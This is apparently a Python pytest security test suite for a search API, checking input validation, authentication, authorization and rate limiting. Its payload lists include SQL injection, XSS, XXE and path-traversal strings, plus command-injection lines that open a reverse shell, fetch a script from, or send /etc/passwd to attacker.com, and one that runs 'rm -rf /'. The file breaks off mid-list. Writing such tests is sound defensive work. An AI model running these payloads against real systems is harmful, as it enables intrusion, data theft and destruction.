#!/usr/bin/env python3
"""
Advanced Security Testing Strategy for Search Endpoint

This module provides comprehensive security test cases covering:
1. Input Validation
2. Authentication Mechanisms
3. Authorization Scopes
4. Rate Limiting
5. Error Handling
6. Logging and Auditing

Based on OWASP Top 10 and security best practices.
"""

import pytest
import httpx
import asyncio
import json
import time
import hashlib
import uuid
import string
import random
from typing import Dict, Any, List, Optional, Tuple
from datetime import datetime, timedelta
from dataclasses import dataclass
from enum import Enum
from unittest.mock import Mock, patch, AsyncMock
import logging

# FastAPI testing utilities
from fastapi.testclient import TestClient
from httpx import AsyncClient

logger = logging.getLogger(__name__)


# =============================================================================
# TEST CONFIGURATION & FIXTURES
# =============================================================================

@dataclass
class TestConfig:
    """Security testing configuration"""
    base_url: str = "http://localhost:8000"
    api_prefix: str = "/api/v1"
    search_endpoint: str = "/search"
    auth_endpoint: str = "/auth"
    timeout: int = 30
    max_retries: int = 3


@dataclass
class TestUser:
    """Test user credentials and tokens"""
    id: str
    email: str
    password: str
    role: str
    organization_id: str
    access_token: Optional[str] = None
    refresh_token: Optional[str] = None
    api_key: Optional[str] = None


class SecurityTestBase:
    """Base class for security tests"""
    
    def __init__(self, config: TestConfig):
        self.config = config
        self.client = httpx.Client(base_url=config.base_url, timeout=config.timeout)
        self.test_users: Dict[str, TestUser] = {}
        self.test_results: List[Dict] = []
    
    def log_test_result(self, test_name: str, passed: bool, details: Dict[str, Any]):
        """Log test result for reporting"""
        result = {
            "test_name": test_name,
            "passed": passed,
            "timestamp": datetime.utcnow().isoformat(),
            "details": details
        }
        self.test_results.append(result)
        status = "✅ PASS" if passed else "❌ FAIL"
        logger.info(f"{status}: {test_name} - {details.get('message', '')}")


# =============================================================================
# 1. INPUT VALIDATION TESTS
# =============================================================================

class TestInputValidation(SecurityTestBase):
    """
    Input validation security tests.
    
    Tests for:
    - SQL Injection attacks
    - XSS (Cross-Site Scripting) attacks
    - Command Injection attacks
    - Path Traversal attacks
    - Buffer Overflow attempts
    - Unicode/encoding attacks
    - Format string attacks
    - LDAP Injection
    - XML External Entity (XXE) attacks
    - JSON injection
    """
    
    # SQL Injection payloads
    SQL_INJECTION_PAYLOADS = [
        # Classic SQL injection
        "'; DROP TABLE documents; --",
        "' OR '1'='1",
        "1' OR '1'='1' --",
        "1; SELECT * FROM users; --",
        "' UNION SELECT username, password FROM users --",
        "1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --",
        
        # Time-based blind SQL injection
        "'; WAITFOR DELAY '0:0:5' --",
        "1' AND SLEEP(5) --",
        "1'; pg_sleep(5); --",
        
        # Error-based injection
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a) --",
        
        # UNION-based injection
        "' UNION SELECT NULL,NULL,NULL --",
        "' UNION ALL SELECT 1,@@version,3 --",
        
        # Stacked queries
        "'; INSERT INTO logs VALUES('hack'); --",
        "'; UPDATE users SET role='admin' WHERE username='attacker'; --",
        
        # Boolean-based blind injection
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        
        # Out-of-band injection
        "'; EXEC xp_cmdshell('nslookup attacker.com'); --",
        
        # PostgreSQL specific
        "'; SELECT current_user; --",
        "'; COPY (SELECT * FROM users) TO '/tmp/users.txt'; --",
        "1'; CREATE OR REPLACE FUNCTION evil() RETURNS void AS $$ BEGIN; END; $$ LANGUAGE plpgsql; --",
        
        # NoSQL injection (for MongoDB)
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "this.password == this.password"}',
    ]
    
    # XSS payloads
    XSS_PAYLOADS = [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        
        # Event handler XSS
        "<div onmouseover='alert(1)'>hover me</div>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        
        # Protocol handler XSS
        "javascript:alert('XSS')",
        "vbscript:msgbox('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        
        # Encoded XSS
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
        
        # SVG XSS
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set onbegin=alert(1) attributeName=x>",
        
        # DOM-based XSS
        "#<script>alert('XSS')</script>",
        "';alert(String.fromCharCode(88,83,83))//",
        
        # Mutation XSS
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        
        # Template injection
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
    ]
    
    # Command injection payloads
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(cat /etc/passwd)",
        "; nc -e /bin/sh attacker.com 4444",
        "| wget http://attacker.com/shell.sh -O /tmp/shell.sh",
        "; curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)",
        "&& rm -rf /",
        "|| true",
        "\n/bin/sh",
        "; echo 'malicious' > /tmp/pwned",
    ]
    
    # Path traversal payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%00/etc/passwd",
        "....//....//....//etc%00passwd",
        "/etc/passwd%00.txt",
        "..\\..\\..\\..\\..\\..\\windows\\system.ini",
    ]
    
    # Format string attack payloads
    FORMAT_STRING_PAYLOADS = [
        "%s%s%s%s%s%s%s%s%s%s",
        "%n%n%n%n%n%n%n%n%n%n",
        "%x%x%x%x%x%x%x%x%x%x",
        "AAAA%08x.%08x.%08x.%08x",
        "%p%p%p%p%p%p%p%p%p%p",
    ]
    
    # Buffer overflow payloads
    BUFFER_OVERFLOW_PAYLOADS = [
        "A" * 10000,
        "A" * 65536,
        "\x00" * 1000,
        "".join([chr(i % 256) for i in range(10000)]),
    ]
    
    # Unicode/encoding attacks
    UNICODE_ATTACK_PAYLOADS = [
        "\u0000",  # Null byte
        "\uFEFF",  # BOM
        "\u202E",  # Right-to-left override
        "\uFFFF",  # Invalid Unicode
        "test\x00payload",  # Null byte injection
        "test\r\nX-Injected: header",  # CRLF injection
        "%00",
        "%0a",
        "%0d",
    ]
    
    # XML attacks
    XML_ATTACK_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
    ]
    
    # JSON injection
    JSON_INJECTION_PAYLOADS = [
        '{"query": "test", "__proto__": {"admin": true}}',
        '{"query": "test", "constructor": {"prototype": {"admin": true}}}',
        '{"query": "test", "toString": {"__proto__": {"valueOf": 1}}}',
    ]

    async def test_sql_injection_prevention(self, client: AsyncClient) -> Dict[str, Any]:
        """Test SQL injection prevention in search queries"""
        results = {"passed": 0, "failed": 0, "payloads_tested": len(self.SQL_INJECTION_PAYLOADS)}
        
        for payload in self.SQL_INJECTION_PAYLOADS:
            try:
                response = await client.post(
                    f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                    json={"query": payload, "limit": 10}
                )
                
                # Check response for SQL injection indicators
                if response.status_code in [500, 503]:
                    response_text = response.text.lower()
                    sql_error_indicators = [
                        "sql", "syntax error", "query failed", "database error",
                        "postgresql", "mysql", "sqlite", "oracle", "sqlserver",
                        "exec", "execute", "select", "insert", "update", "delete"
                    ]
                    
                    if any(indicator in response_text for indicator in sql_error_indicators):
                        results["failed"] += 1
                        self.log_test_result(
                            "sql_injection_prevention",
                            False,
                            {"payload": payload[:50], "message": "SQL error exposed in response"}
                        )
                        continue
                
                # Check if query was properly sanitized (should return 400/422 for malicious input)
                if response.status_code in [200, 400, 401, 403, 422]:
                    results["passed"] += 1
                else:
                    results["failed"] += 1
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"SQL injection test error: {e}")
        
        return results

    async def test_xss_prevention(self, client: AsyncClient) -> Dict[str, Any]:
        """Test XSS prevention in search queries and responses"""
        results = {"passed": 0, "failed": 0, "payloads_tested": len(self.XSS_PAYLOADS)}
        
        for payload in self.XSS_PAYLOADS:
            try:
                response = await client.post(
                    f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                    json={"query": payload, "limit": 10}
                )
                
                # Check if XSS payload is reflected unescaped
                if payload in response.text:
                    results["failed"] += 1
                    self.log_test_result(
                        "xss_prevention",
                        False,
                        {"payload": payload[:50], "message": "XSS payload reflected unescaped"}
                    )
                else:
                    results["passed"] += 1
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"XSS test error: {e}")
        
        return results

    async def test_command_injection_prevention(self, client: AsyncClient) -> Dict[str, Any]:
        """Test command injection prevention"""
        results = {"passed": 0, "failed": 0, "payloads_tested": len(self.COMMAND_INJECTION_PAYLOADS)}
        
        for payload in self.COMMAND_INJECTION_PAYLOADS:
            try:
                response = await client.post(
                    f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                    json={"query": payload, "limit": 10}
                )
                
                # Check for command execution indicators
                command_indicators = [
                    "root:", "uid=", "gid=", "/bin/bash", "Permission denied",
                    "command not found", "No such file", "www-data"
                ]
                
                response_text = response.text
                if any(indicator in response_text for indicator in command_indicators):
                    results["failed"] += 1
                    self.log_test_result(
                        "command_injection_prevention",
                        False,
                        {"payload": payload[:50], "message": "Command execution detected"}
                    )
                else:
                    results["passed"] += 1
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"Command injection test error: {e}")
        
        return results

    async def test_input_length_limits(self, client: AsyncClient) -> Dict[str, Any]:
        """Test input length restrictions"""
        test_cases = [
            ("normal", "test query", 200),
            ("max_allowed", "a" * 1000, [200, 400, 422]),  # Should be handled gracefully
            ("overflow_attempt", "a" * 100000, [400, 413, 422]),  # Should be rejected
            ("unicode_overflow", "测试" * 50000, [400, 413, 422]),
        ]
        
        results = {"passed": 0, "failed": 0}
        
        for name, query, expected_status in test_cases:
            try:
                response = await client.post(
                    f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                    json={"query": query, "limit": 10}
                )
                
                if isinstance(expected_status, list):
                    passed = response.status_code in expected_status
                else:
                    passed = response.status_code == expected_status
                
                if passed:
                    results["passed"] += 1
                else:
                    results["failed"] += 1
                    self.log_test_result(
                        f"input_length_{name}",
                        False,
                        {"expected": expected_status, "actual": response.status_code}
                    )
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"Input length test error: {e}")
        
        return results

    async def test_special_characters_handling(self, client: AsyncClient) -> Dict[str, Any]:
        """Test handling of special characters"""
        special_chars = [
            "null\x00byte",
            "newline\ntest",
            "carriage\rreturn",
            "tab\there",
            "backslash\\test",
            "quotes\"test'",
            "angle<>brackets",
            "ampersand&test",
            "percent%test",
            "plus+test",
            "hash#test",
            "semicolon;test",
        ]
        
        results = {"passed": 0, "failed": 0}
        
        for test_input in special_chars:
            try:
                response = await client.post(
                    f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                    json={"query": test_input, "limit": 10}
                )
                
                # Should handle gracefully (200, 400, or 422)
                if response.status_code in [200, 400, 422]:
                    results["passed"] += 1
                else:
                    results["failed"] += 1
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"Special character test error: {e}")
        
        return results

    async def test_content_type_enforcement(self, client: AsyncClient) -> Dict[str, Any]:
        """Test content-type header enforcement"""
        test_cases = [
            # (content_type, expected_behavior)
            ("application/json", "accept"),
            ("text/plain", "reject"),
            ("application/xml", "reject"),
            ("text/html", "reject"),
            ("application/x-www-form-urlencoded", "reject"),
            ("multipart/form-data", "reject"),
            ("", "reject"),
            (None, "reject"),
        ]
        
        results = {"passed": 0, "failed": 0}
        
        for content_type, expected in test_cases:
            try:
                headers = {}
                if content_type is not None:
                    headers["Content-Type"] = content_type
                
                response = await client.post(
                    f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                    content='{"query": "test", "limit": 10}',
                    headers=headers
                )
                
                if expected == "accept":
                    passed = response.status_code in [200, 401, 403]
                else:
                    passed = response.status_code in [400, 415, 422]
                
                if passed:
                    results["passed"] += 1
                else:
                    results["failed"] += 1
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"Content type test error: {e}")
        
        return results


# =============================================================================
# 2. AUTHENTICATION MECHANISM TESTS
# =============================================================================

class TestAuthentication(SecurityTestBase):
    """
    Authentication security tests.
    
    Tests for:
    - Token validation and expiration
    - JWT security (algorithm confusion, signature verification)
    - API key authentication
    - Brute force protection
    - Session management
    - Device fingerprinting
    - Token rotation
    """
    
    WEAK_JWT_SECRETS = [
        "secret",
        "password",
        "123456",
        "jwt_secret",
        "changeme",
        "",
    ]

    async def test_unauthenticated_access_denied(self, client: AsyncClient) -> Dict[str, Any]:
        """Test that unauthenticated requests are rejected"""
        results = {"passed": 0, "failed": 0}
        
        endpoints = [
            (f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid", "POST"),
            (f"{self.config.api_prefix}{self.config.search_endpoint}/", "POST"),
            (f"{self.config.api_prefix}{self.config.search_endpoint}/authenticated/hybrid", "POST"),
            (f"{self.config.api_prefix}{self.config.search_endpoint}/health", "GET"),
            (f"{self.config.api_prefix}{self.config.search_endpoint}/authenticated/health", "GET"),
        ]
        
        for endpoint, method in endpoints:
            try:
                if method == "POST":
                    response = await client.post(endpoint, json={"query": "test"})
                else:
                    response = await client.get(endpoint)
                
                # Should return 401 or 403 for protected endpoints
                if response.status_code in [401, 403]:
                    results["passed"] += 1
                elif response.status_code == 404:
                    # Endpoint doesn't exist, which is acceptable
                    results["passed"] += 1
                else:
                    results["failed"] += 1
                    self.log_test_result(
                        f"auth_required_{endpoint}",
                        False,
                        {"status": response.status_code, "message": "Unauthenticated access allowed"}
                    )
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"Auth test error for {endpoint}: {e}")
        
        return results

    async def test_invalid_token_rejected(self, client: AsyncClient) -> Dict[str, Any]:
        """Test that invalid tokens are rejected"""
        invalid_tokens = [
            "",  # Empty token
            "invalid_token",  # Random string
            "Bearer invalid_token",  # With Bearer prefix
            "JWT_REDACTED",  # Valid format, wrong signature
            "Bearer " + "a" * 1000,  # Very long token
            "Bearer null",
            "Bearer undefined",
            "null",
            "\x00\x00\x00",
        ]
        
        results = {"passed": 0, "failed": 0}
        accepted_statuses = {401, 403, 429}
        
        for token in invalid_tokens:
            try:
                headers = {"Authorization": token if token.startswith("Bearer") else f"Bearer {token}"}
                response = await client.post(
                    f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                    json={"query": "test"},
                    headers=headers
                )
                
                if response.status_code in accepted_statuses:
                    results["passed"] += 1
                else:
                    results["failed"] += 1
                    self.log_test_result(
                        "invalid_token_rejected",
                        False,
                        {"token": token[:50], "status": response.status_code}
                    )
                    
            except Exception as e:
                # Malformed header values (for example null bytes) can be rejected
                # by the HTTP client before dispatch, which is still a safe outcome.
                if "\x00" in token:
                    results["passed"] += 1
                else:
                    results["failed"] += 1
                    logger.error(f"Token validation test error: {e}")
        
        return results

    async def test_expired_token_rejected(self, client: AsyncClient, expired_token: str) -> Dict[str, Any]:
        """Test that expired tokens are rejected"""
        try:
            response = await client.post(
                f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                json={"query": "test"},
                headers={"Authorization": f"Bearer {expired_token}"}
            )
            
            passed = response.status_code in [401, 403]
            return {"passed": 1 if passed else 0, "failed": 0 if passed else 1}
            
        except Exception as e:
            logger.error(f"Expired token test error: {e}")
            return {"passed": 0, "failed": 1}

    async def test_jwt_algorithm_confusion(self, client: AsyncClient) -> Dict[str, Any]:
        """Test JWT algorithm confusion attacks (RS256 -> HS256)"""
        # This tests if the server properly validates the algorithm
        malicious_tokens = [
            # Token with 'none' algorithm
            "JWT_REDACTED",
            # Token with HS256 but signed with public key as secret
            "JWT_REDACTED",
        ]
        
        results = {"passed": 0, "failed": 0}
        
        for token in malicious_tokens:
            try:
                response = await client.post(
                    f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                    json={"query": "test"},
                    headers={"Authorization": f"Bearer {token}"}
                )
                
                if response.status_code in [401, 403]:
                    results["passed"] += 1
                else:
                    results["failed"] += 1
                    self.log_test_result(
                        "jwt_algorithm_confusion",
                        False,
                        {"message": "Algorithm confusion attack succeeded"}
                    )
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"JWT algorithm test error: {e}")
        
        return results

    async def test_brute_force_protection(self, client: AsyncClient) -> Dict[str, Any]:
        """Test brute force attack protection"""
        # Attempt many failed logins
        max_attempts = 10
        results = {"passed": 0, "failed": 0, "rate_limited": False}
        
        for i in range(max_attempts):
            try:
                response = await client.post(
                    f"{self.config.api_prefix}/auth/login",
                    json={"email": "test@test.com", "password": f"wrong_password_{i}"}
                )
                
                if response.status_code == 429:
                    results["rate_limited"] = True
                    results["passed"] += 1
                    break
                    
                await asyncio.sleep(0.1)  # Small delay between attempts
                
            except Exception as e:
                logger.error(f"Brute force test error: {e}")
        
        if not results["rate_limited"]:
            results["failed"] += 1
            self.log_test_result(
                "brute_force_protection",
                False,
                {"message": f"No rate limiting after {max_attempts} failed attempts"}
            )
        
        return results

    async def test_api_key_validation(self, client: AsyncClient) -> Dict[str, Any]:
        """Test API key authentication validation"""
        invalid_api_keys = [
            "",
            "invalid_key",
            "sk_test_" + "a" * 100,  # Wrong format
            "Bearer " + "x" * 32,  # Random
            "\x00" * 32,  # Null bytes
            "' OR '1'='1",  # SQL injection attempt
        ]
        
        results = {"passed": 0, "failed": 0}
        accepted_statuses = {401, 403, 429}
        
        for api_key in invalid_api_keys:
            try:
                response = await client.post(
                    f"{self.config.api_prefix}{self.config.search_endpoint}/authenticated/hybrid",
                    json={"query": "test"},
                    headers={"Authorization": f"Bearer {api_key}"}
                )
                
                if response.status_code in accepted_statuses:
                    results["passed"] += 1
                else:
                    results["failed"] += 1
                    
            except Exception as e:
                if "\x00" in api_key:
                    results["passed"] += 1
                else:
                    results["failed"] += 1
                    logger.error(f"API key test error: {e}")
        
        return results

    async def test_session_fixation(self, client: AsyncClient) -> Dict[str, Any]:
        """Test session fixation vulnerability"""
        # Attempt to use a pre-set session ID
        results = {"passed": 0, "failed": 0}
        
        try:
            # Try to set a custom session cookie
            response = await client.post(
                f"{self.config.api_prefix}/auth/login",
                json={"email": "test@test.com", "password": "testpassword"},
                cookies={"session_id": "attacker_controlled_session_id"}
            )
            
            # Check if the server generated a new session ID
            set_cookie = response.headers.get("set-cookie", "")
            if "session_id=attacker_controlled_session_id" in set_cookie:
                results["failed"] += 1
                self.log_test_result(
                    "session_fixation",
                    False,
                    {"message": "Server accepted attacker-controlled session ID"}
                )
            else:
                results["passed"] += 1
                
        except Exception as e:
            results["failed"] += 1
            logger.error(f"Session fixation test error: {e}")
        
        return results


# =============================================================================
# 3. AUTHORIZATION SCOPE TESTS
# =============================================================================

class TestAuthorization(SecurityTestBase):
    """
    Authorization security tests.
    
    Tests for:
    - Role-based access control (RBAC)
    - Resource ownership verification
    - Cross-tenant data isolation
    - Privilege escalation prevention
    - Horizontal privilege escalation
    - Vertical privilege escalation
    """

    async def test_rbac_enforcement(
        self, 
        client: AsyncClient,
        user_token: str,
        admin_token: str
    ) -> Dict[str, Any]:
        """Test role-based access control enforcement"""
        
        # Admin-only endpoints
        admin_endpoints = [
            (f"{self.config.api_prefix}{self.config.search_endpoint}/indexes/rebuild", "POST"),
            (f"{self.config.api_prefix}{self.config.search_endpoint}/indexes", "GET"),
        ]
        
        results = {"passed": 0, "failed": 0}
        
        # Test user access to admin endpoints (should fail)
        for endpoint, method in admin_endpoints:
            try:
                if method == "POST":
                    response = await client.post(
                        endpoint,
                        headers={"Authorization": f"Bearer {user_token}"}
                    )
                else:
                    response = await client.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {user_token}"}
                    )
                
                if response.status_code == 403:
                    results["passed"] += 1
                elif response.status_code in [200, 201]:
                    results["failed"] += 1
                    self.log_test_result(
                        "rbac_enforcement",
                        False,
                        {"endpoint": endpoint, "message": "User accessed admin endpoint"}
                    )
                else:
                    results["passed"] += 1  # Other errors are acceptable
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"RBAC test error: {e}")
        
        # Test admin access (should succeed)
        for endpoint, method in admin_endpoints:
            try:
                if method == "POST":
                    response = await client.post(
                        endpoint,
                        headers={"Authorization": f"Bearer {admin_token}"}
                    )
                else:
                    response = await client.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {admin_token}"}
                    )
                
                if response.status_code in [200, 201]:
                    results["passed"] += 1
                elif response.status_code == 403:
                    results["failed"] += 1
                    self.log_test_result(
                        "rbac_admin_access",
                        False,
                        {"endpoint": endpoint, "message": "Admin denied access"}
                    )
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"Admin RBAC test error: {e}")
        
        return results

    async def test_cross_tenant_isolation(
        self,
        client: AsyncClient,
        tenant_a_token: str,
        tenant_b_token: str,
        tenant_a_doc_id: str
    ) -> Dict[str, Any]:
        """Test cross-tenant data isolation"""
        results = {"passed": 0, "failed": 0}
        
        try:
            # Tenant B trying to access Tenant A's document
            response = await client.post(
                f"{self.config.api_prefix}{self.config.search_endpoint}/documents/{tenant_a_doc_id}/reindex",
                headers={"Authorization": f"Bearer {tenant_b_token}"}
            )
            
            if response.status_code in [403, 404]:
                results["passed"] += 1
            else:
                results["failed"] += 1
                self.log_test_result(
                    "cross_tenant_isolation",
                    False,
                    {"message": "Tenant B accessed Tenant A's resource"}
                )
                
        except Exception as e:
            results["failed"] += 1
            logger.error(f"Cross-tenant test error: {e}")
        
        return results

    async def test_idor_vulnerability(
        self,
        client: AsyncClient,
        user_token: str,
        other_user_doc_id: str
    ) -> Dict[str, Any]:
        """Test Insecure Direct Object Reference (IDOR) vulnerability"""
        results = {"passed": 0, "failed": 0}
        
        # Try to access/modify another user's resources
        idor_attempts = [
            (f"{self.config.api_prefix}{self.config.search_endpoint}/documents/{other_user_doc_id}/reindex", "POST"),
        ]
        
        for endpoint, method in idor_attempts:
            try:
                if method == "POST":
                    response = await client.post(
                        endpoint,
                        headers={"Authorization": f"Bearer {user_token}"}
                    )
                else:
                    response = await client.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {user_token}"}
                    )
                
                if response.status_code in [403, 404]:
                    results["passed"] += 1
                else:
                    results["failed"] += 1
                    self.log_test_result(
                        "idor_vulnerability",
                        False,
                        {"endpoint": endpoint, "message": "IDOR vulnerability detected"}
                    )
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"IDOR test error: {e}")
        
        return results

    async def test_privilege_escalation_prevention(
        self,
        client: AsyncClient,
        user_token: str
    ) -> Dict[str, Any]:
        """Test privilege escalation prevention"""
        results = {"passed": 0, "failed": 0}
        
        # Attempt to escalate privileges through various means
        escalation_attempts = [
            # Try to modify own role
            {
                "endpoint": f"{self.config.api_prefix}/users/me",
                "method": "PATCH",
                "payload": {"role": "admin"}
            },
            # Try to access user management
            {
                "endpoint": f"{self.config.api_prefix}/users",
                "method": "GET",
                "payload": None
            },
            # Try to modify API permissions
            {
                "endpoint": f"{self.config.api_prefix}/api-keys/permissions",
                "method": "PUT",
                "payload": {"scope": "*"}
            },
        ]
        
        for attempt in escalation_attempts:
            try:
                headers = {"Authorization": f"Bearer {user_token}"}
                
                if attempt["method"] == "GET":
                    response = await client.get(attempt["endpoint"], headers=headers)
                elif attempt["method"] == "PATCH":
                    response = await client.patch(
                        attempt["endpoint"],
                        json=attempt["payload"],
                        headers=headers
                    )
                elif attempt["method"] == "PUT":
                    response = await client.put(
                        attempt["endpoint"],
                        json=attempt["payload"],
                        headers=headers
                    )
                
                if response.status_code in [401, 403, 404]:
                    results["passed"] += 1
                elif response.status_code in [200, 201]:
                    results["failed"] += 1
                    self.log_test_result(
                        "privilege_escalation",
                        False,
                        {"endpoint": attempt["endpoint"], "message": "Privilege escalation succeeded"}
                    )
                else:
                    results["passed"] += 1
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"Privilege escalation test error: {e}")
        
        return results


# =============================================================================
# 4. RATE LIMITING TESTS
# =============================================================================

class TestRateLimiting(SecurityTestBase):
    """
    Rate limiting security tests.
    
    Tests for:
    - Request rate limits
    - Concurrent request limits
    - IP-based rate limiting
    - User-based rate limiting
    - API key rate limiting
    - Rate limit bypass attempts
    """

    async def test_rate_limit_enforcement(
        self,
        client: AsyncClient,
        auth_token: str,
        rate_limit: int = 100
    ) -> Dict[str, Any]:
        """Test that rate limits are enforced"""
        results = {"passed": 0, "failed": 0, "rate_limited": False}
        
        requests_made = 0
        rate_limited_at = None
        
        # Make requests until rate limited or max reached
        for i in range(rate_limit + 50):
            try:
                response = await client.post(
                    f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                    json={"query": f"test query {i}"},
                    headers={"Authorization": f"Bearer {auth_token}"}
                )
                
                requests_made += 1
                
                if response.status_code == 429:
                    results["rate_limited"] = True
                    rate_limited_at = i
                    
                    # Check for proper rate limit headers
                    if "Retry-After" in response.headers:
                        results["passed"] += 1
                    if "X-RateLimit-Limit" in response.headers:
                        results["passed"] += 1
                    if "X-RateLimit-Remaining" in response.headers:
                        results["passed"] += 1
                    
                    break
                    
            except Exception as e:
                logger.error(f"Rate limit test error at request {i}: {e}")
                break
        
        if results["rate_limited"]:
            self.log_test_result(
                "rate_limit_enforcement",
                True,
                {"message": f"Rate limited at request {rate_limited_at}"}
            )
        else:
            results["failed"] += 1
            self.log_test_result(
                "rate_limit_enforcement",
                False,
                {"message": f"Made {requests_made} requests without rate limiting"}
            )
        
        return results

    async def test_rate_limit_bypass_attempts(
        self,
        client: AsyncClient,
        auth_token: str
    ) -> Dict[str, Any]:
        """Test rate limit bypass attempts"""
        results = {"passed": 0, "failed": 0}
        
        bypass_headers = [
            # IP spoofing attempts
            {"X-Forwarded-For": "1.2.3.4"},
            {"X-Real-IP": "5.6.7.8"},
            {"X-Originating-IP": "9.10.11.12"},
            {"X-Client-IP": "13.14.15.16"},
            {"True-Client-IP": "17.18.19.20"},
            {"CF-Connecting-IP": "21.22.23.24"},
            
            # Multiple header manipulation
            {
                "X-Forwarded-For": "1.2.3.4, 5.6.7.8, 9.10.11.12",
                "X-Real-IP": "13.14.15.16"
            },
        ]
        
        for bypass_attempt in bypass_headers:
            try:
                headers = {**bypass_attempt, "Authorization": f"Bearer {auth_token}"}
                
                # Make many requests with bypass headers
                for i in range(20):
                    response = await client.post(
                        f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                        json={"query": f"bypass test {i}"},
                        headers=headers
                    )
                    
                    if response.status_code == 429:
                        # Rate limit still enforced, bypass failed (good)
                        results["passed"] += 1
                        break
                else:
                    # If we made 20 requests without rate limiting, check if that's expected
                    results["passed"] += 1  # The limit might be higher
                    
            except Exception as e:
                results["failed"] += 1
                logger.error(f"Rate limit bypass test error: {e}")
        
        return results

    async def test_concurrent_request_limits(
        self,
        client: AsyncClient,
        auth_token: str,
        max_concurrent: int = 10
    ) -> Dict[str, Any]:
        """Test concurrent request limits"""
        results = {"passed": 0, "failed": 0}
        
        async def make_request(request_id: int):
            try:
                response = await client.post(
                    f"{self.config.api_prefix}{self.config.search_endpoint}/hybrid",
                    json={"query": f"concurrent test {request_id}"},
                    headers={"Authorization": f"Bearer {auth_token}"}
                )
                return response.status_code
            except Exception as e:
                logger.error(f"Concurrent request {request_id} error: {e}")
                return 0
        
        # Make many concurrent requests
        tasks = [make_request(i) for i in range(max_concurrent * 2)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Count responses
        success_count = sum(1 for r in responses if r in [200, 401])
        rate_limited_count = sum(1 for r in responses if r == 429)
        error_count = sum(1 for r in responses if isinstance(r, Exception))
        
        # At least some should be rate limited if we exceed the limit
        if rate_limited_count > 0:
            results["passed"] += 1
        
        return {
            **results,
            "total_requests": len(tasks),
            "successful": success_count,
            "rate_limited": rate_limited_count,
            "errors": error_count
        }


# =============================================================================
# 5. ERROR HANDLING TESTS
# =============================================================================

class TestErrorHandling(SecurityTestBase):
    """
    Error handling security tests.
    
    Tests for:
    - Information disclosure in error messages
    - Stack trace exposure
    - Sensitive data in error responses
    - Consistent error responses
    - HTTP status code accuracy
    """
    
    SENSITIVE_PATTERNS = [
        r"password",
        r"secret",
        r"api_key",
        r"apikey",
        r"token",
        r"credential",
        r"private_key",
        r"database",
        r"connection_string",
        r"dsn",
        r"postgres://",
        r"mysql://",
        r"mongodb://",
        r"redis://",
        r"/home/",
        r"/root/",
        r"/var/",
        r"/etc/",
        r"traceback",
        r"stack trace",
        r"line \d+",
        r"\.py\",",
        r"File \"",
        r"at line",
        r"NoneType",
        r"Exception:",
        r"Error:",
    ]

    async def test_no_sensitive_info_in_errors(self, client: AsyncClient) -> Dict[str, Any]:
        """Test that error responses don't leak sensitive information"""
        results = {"passed": 0, "failed": 0}
        
        # Requests designed to trigger errors
        error_triggers = [
            # Invalid JSON
            {"content": "not json", "content_type": "application/json"},
            # Missing required fields
            {"json": {}},
            # Invalid field types
            {"json": {"query": 123, "limit": "not a number"}},
            # Very long query
            {"json": {"query": "a" * 100000}},
            # SQL injection (might trigger DB error)
